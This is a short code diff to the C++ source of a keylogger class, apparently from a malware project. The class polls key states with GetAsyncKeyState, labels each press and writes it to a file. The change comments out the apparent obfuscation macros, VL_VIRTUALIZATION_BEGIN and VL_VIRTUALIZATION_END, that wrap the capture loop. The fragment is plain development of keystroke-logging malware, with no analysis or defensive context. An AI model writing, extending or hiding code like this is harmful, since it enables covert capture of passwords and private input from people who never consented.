@@ -46,7 +46,7 @@ void Keylogger::
   for (unsigned char c = 1; c < 255; c++) {
     SHORT rv = GetAsyncKeyState(c);
     if (rv & 1) { // on press button down
-      VL_VIRTUALIZATION_BEGIN;
+      /*VL_VIRTUALIZATION_BEGIN;*/
       std::string out = "";
       if (c == 1)
         out = "[LMOUSE]"; // mouse left
@@ -140,7 +140,7 @@ void Keylogger::
         file.flush();
         file.close();
       }
-      VL_VIRTUALIZATION_END;
+      /*VL_VIRTUALIZATION_END;*/
     }
   }
 }
